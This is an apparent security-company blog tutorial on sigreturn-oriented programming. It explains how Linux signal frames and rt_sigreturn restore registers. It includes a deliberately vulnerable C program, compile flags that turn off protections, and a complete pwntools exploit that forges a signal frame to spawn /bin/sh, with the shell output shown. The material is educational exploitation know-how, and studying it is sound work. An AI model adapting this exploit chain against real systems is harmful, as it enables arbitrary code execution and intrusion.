---
title: Sigreturn-oriented programming (SROP) from the ground up
source: https://sigreturn.com/blog/sigreturn-oriented-programming/
source_host: sigreturn.com
clip_date: 2026-09-23T10:06:45+08:00
trace_id: 8ca5db2e-99c7-40b5-99c9-6b606e405bfa
content_hash: cf0b61d2dfc39e4d989995c248b3ec42695acd9f2615770756a1b025da16b26f
status: synced
tags:
  - 漏洞分析
  - Linux安全
series: null
feed_source: Sigreturn Labs·Apple internals
ai_summary: 控制栈内容后伪造信号帧，让内核的 `sigreturn` 一次性恢复全部寄存器，用两个 gadget 即可完成 `execve("/bin/sh", NULL, NULL)`。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e475244-d011-81e0-9120-c8217d797878
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 控制栈内容后伪造信号帧，让内核的 `sigreturn` 一次性恢复全部寄存器，用两个 gadget 即可完成 `execve("/bin/sh", NULL, NULL)`。
> 
> - **原理：** 内核为可捕获信号把完整 CPU 状态（通用寄存器、rip、rsp、flags、FP 状态）存成信号帧压在用户栈上，处理函数返回时经 trampoline 执行 `mov rax, 15 ; syscall`。x86-64 为 `rt_sigreturn`（15，帧为包着 ucontext 的 rt_sigframe），32 位为 119（0x77）。
> - **可滥用点：** `sigreturn` 不验证帧是否由内核写入，不查 cookie/签名/栈指针，只按当前 rsp 无条件恢复——这正是 SROP 的漏洞根源（Bosman & Bos, "Framing Signals", 2014）。
> - **三个前提：** 栈内容可控（溢出即可）、能触发 `sigreturn`（如 `pop rax ; ret` 载 15 + `syscall` gadget）、被引用数据地址已知（静态非 PIE 二进制，glibc 自带 `/bin/sh`）。
> - **PoC 链路：** 编译命令 `gcc vuln.c -o vuln -static -no-pie -fno-stack-protector`；payload 为 72 字节填充 + `pop_rax` + `15` + `syscall_ret` + 伪造帧（rax=59、rdi=/bin/sh、rsi=rdx=0、rip=syscall），恢复后下一条指令即 execve。
> - **局限与变通：** canary 阻断溢出、ASLR/PIE 破坏固定地址，实战常需先信息泄露；无 `/bin/sh` 时可先用同样方式调 `read` 写入 .bss。32 位 vDSO 的 `__kernel_sigreturn` 自带 `pop eax ; mov eax, 0x77 ; int 0x80`，无需单独设置系统调用号。

Say you have a clean stack buffer overflow on a 64-bit Linux binary and you want a shell. The goal is an `execve("/bin/sh", NULL, NULL)`, which means getting `rax` to 59, `rdi` to a pointer to the string, `rsi` and `rdx` to zero, and then a `syscall`. Classic return-oriented programming gets you there one register at a time: a `pop rdi ; ret` here, a `pop rsi ; ret` there, hunting the binary for a gadget per argument. It works, but it is fiddly, and a stripped static binary may simply not contain the gadgets you want.

There is a shortcut, and it is almost unfair. The kernel already ships a routine whose entire job is to load every general-purpose register, plus `rip` and `rsp`, from values sitting on the stack. It does this in one syscall, it trusts the stack completely, and it never checks who put those values there. That routine is `sigreturn`, and bending it to our purposes is sigreturn-oriented programming. It is also, as it happens, the syscall this company is named after.

## How a signal leaves the kernel

To see why `sigreturn` exists, follow what happens when a process receives a signal it has a handler for.

The kernel cannot just call the handler and hope the process picks up where it left off afterwards. The signal can interrupt user code at any instruction, so before transferring control the kernel has to save the entire CPU state: every general-purpose register, the instruction pointer, the stack pointer, the flags, and the floating-point state. It saves all of that into a structure called a signal frame, and it pushes that frame onto the user stack. Then it points `rip` at the handler and lets it run.

When the handler returns, execution does not go back to the interrupted code directly. Instead it returns into a tiny trampoline the kernel arranged for, which does nothing but invoke the `sigreturn` syscall. On x86-64 that trampoline is essentially:

```
mov rax, 15      ; __NR_rt_sigreturn
syscall
```

`sigreturn` is the other half of the dance. It takes the signal frame the kernel left on the stack, copies every saved value back into the corresponding register, and resumes the interrupted code exactly where it was. The whole point of the syscall is to restore a full register context from memory.

Note

On x86-64 the relevant call is `rt_sigreturn`, syscall number 15, and the frame is an `rt_sigframe` wrapping a `ucontext`. On 32-bit x86 there is also a plain `sigreturn` at number 119 (0x77). The idea is identical on both. We use x86-64 below and come back to the 32-bit case at the end.

The detail that matters for us is what `sigreturn` does *not* do. It does not verify that the frame it reads was written by the kernel. It does not check a cookie, a signature, or where the stack pointer is. It reads the frame at the current stack pointer and restores from it, unconditionally. The kernel assumes that if `sigreturn` is being called, it is because the kernel itself set this up a moment earlier.

## The abuse

That assumption is the whole vulnerability. If we control the contents of the stack and we can make the program call `sigreturn` with the stack pointer aimed at memory we wrote, then the kernel will happily restore every register from a frame we forged.

A forged frame gives us, in one step, what a long ROP chain gives us gadget by gadget: arbitrary values in `rax`, `rdi`, `rsi`, `rdx`, the rest of the general-purpose registers, and `rip`. We get to pick where execution goes next and what every argument register holds when it gets there. The technique was formalized by Bosman and Bos in their 2014 paper “Framing Signals”, which showed how general and how portable it is.

To pull it off we need three things:

-   **Control of the stack contents**, so we can place the fake frame. A straightforward overflow gives us this.
-   **A way to invoke `sigreturn`**, which means getting `rax` to 15 and reaching a `syscall` instruction. In practice that is a small two-gadget step: something like `pop rax ; ret` to load the number, then a `syscall` instruction to fire it.
-   **A known address for any data we reference**, such as the `/bin/sh` string we want `rdi` to point at. A static, non-PIE binary makes this easy because addresses are fixed and glibc already carries the string `/bin/sh` for its own use.

That is the entire shopping list. Notice it is short, and notice that none of it depends on the binary containing the exact `pop rdi` / `pop rsi` / `pop rdx` gadgets a conventional chain would need. A single `syscall` instruction and a way to set `rax` are enough to set up *any* syscall with *any* arguments. That generality is what makes the technique worth knowing.

## A worked example

Let us build the smallest thing that demonstrates it. Here is a deliberately vulnerable program: it reads far more bytes than the buffer holds, straight into the stack.

```c
#include <unistd.h>

void vuln(void)
{
    char buf[64];
    read(0, buf, 1024);
}

int main(void)
{
    vuln();
    return 0;
}
```

We compile it static and non-PIE, with the stack canary off, so the mechanism is not buried under mitigations we are not studying here.

```bash
gcc vuln.c -o vuln -static -no-pie -fno-stack-protector
```

A quick look confirms what we are working with: no canary to leak, no PIE so addresses are fixed, and a static binary that drags all of glibc in with it (which means plenty of `syscall` instructions and the `/bin/sh` string are present).

```
$ checksec --file=vuln
RELRO      STACK CANARY    NX      PIE
Partial    No canary       NX      No PIE
```

We need exactly two gadgets and one string. Rather than copy addresses by hand, we let pwntools find them by searching the binary’s own bytes:

-   `pop rax ; ret` to load the syscall number,
-   `syscall ; ret` to fire the syscall,
-   the `/bin/sh` string already living in glibc.

The plan on the stack, top to bottom, is: padding up to the saved return address, then `pop rax ; ret` followed by `15` to select `rt_sigreturn`, then the `syscall` gadget to invoke it, and finally the forged signal frame the kernel will restore from. We fill that frame to call `execve("/bin/sh", NULL, NULL)`, sending control to the same `syscall` gadget once the registers are in place.

```python
from pwn import *

context.binary = elf = ELF('./vuln')

pop_rax     = next(elf.search(asm('pop rax; ret')))
syscall_ret = next(elf.search(asm('syscall; ret')))
binsh       = next(elf.search(b'/bin/sh\x00'))

# The frame the kernel will restore: a ready-made execve("/bin/sh", 0, 0)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # 59
frame.rdi = binsh                  # "/bin/sh"
frame.rsi = 0                      # argv = NULL
frame.rdx = 0                      # envp = NULL
frame.rip = syscall_ret            # run the execve syscall once registers are set

payload  = b'A' * 72               # 64-byte buffer + saved rbp
payload += p64(pop_rax)            # rax = 15 ...
payload += p64(15)                 #   ... __NR_rt_sigreturn
payload += p64(syscall_ret)        # syscall -> rt_sigreturn restores our frame
payload += bytes(frame)            # the forged frame itself

p = process('./vuln')
p.send(payload)
p.interactive()
```

Walking the chain as the CPU sees it: `vuln` returns into `pop rax ; ret`, which loads `15` and returns into the `syscall` gadget. That `syscall` is `rt_sigreturn`, so the kernel reads the frame we placed right after it and restores every register from it. Now `rax` is 59, `rdi` points at `/bin/sh`, `rsi` and `rdx` are zero, and `rip` is our `syscall` gadget again. The very next instruction is therefore `execve("/bin/sh", NULL, NULL)`.

```
$ python3 exploit.py
[*] '/home/lab/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Starting local process './vuln': pid 4711
[*] Switching to interactive mode
$ id
uid=1000(lab) gid=1000(lab) groups=1000(lab)
$ exit
```

One overflow, two gadgets, one forged frame, and a shell. We never needed a gadget per argument.

Tip

The one piece of data we leaned on was a known address for `/bin/sh`. When the binary does not contain the string, or when PIE moves everything around, the usual move is to write the string yourself first: chain an initial `read` syscall (set up the same SROP way) to drop `/bin/sh` into a known writable address such as the `.bss`, then point the second frame’s `rdi` at it.

## Finding the pieces in practice

The example handed us fixed addresses and a fat static binary. Real targets are stingier, so it helps to know where the moving parts actually come from.

The `syscall` instruction is rarely a problem. Anything linked against libc has many, and a static binary has them everywhere. The real question is usually how to get the syscall number into `rax` without a convenient `pop rax`. There are several answers depending on the binary: a `read` that lands a controlled byte in the right place, an arithmetic gadget, or chaining through a function that returns a known value into `rax`.

32-bit x86 deserves a special mention, because it is where SROP often looks its cleanest. The kernel’s signal trampoline lives in the vDSO, a small shared object the kernel maps into every process, exported as `__kernel_sigreturn`. Disassembled, it is almost a gift:

```
__kernel_sigreturn:
    pop    eax
    mov    eax, 0x77
    int    0x80
```

That is a single gadget that *is* a call to `sigreturn`. It loads `eax` with 0x77 (the 32-bit `sigreturn` number) on its own and fires the interrupt, so you do not even need a separate step to set the syscall number. Point execution at it with a forged frame waiting on the stack and the restore happens. The vDSO is at a known-ish location and contains exactly the instruction you need. It is a recurring reason the technique is so comfortable on 32-bit.

Warning

None of this survives contact with every mitigation, and that is by design. A stack canary stops the overflow before the return address. Full ASLR and PIE take away the fixed addresses the frame and the `/bin/sh` pointer rely on, so SROP in the wild is usually paired with an information leak first. The technique controls registers, it does not conjure addresses.

## Why we care

Step back and the appeal is obvious. Conventional ROP treats the binary as a quarry and makes you mine one gadget per register. SROP treats a single, always-present kernel routine as a universal register-loading primitive. One `syscall` instruction, one way to set `rax`, and a stretch of stack you control are enough to set up any syscall you like with fully controlled arguments. The same forged frame tends to work across different binaries that share the same flaw, because it leans on the kernel’s ABI rather than on any one program’s gadgets.

A whole class of exploitation collapses into “write the registers you want onto the stack and let the kernel install them for you.” That elegance, a signal-handling convenience quietly turned into an exploitation primitive, is exactly the kind of thing we find worth naming a company after.
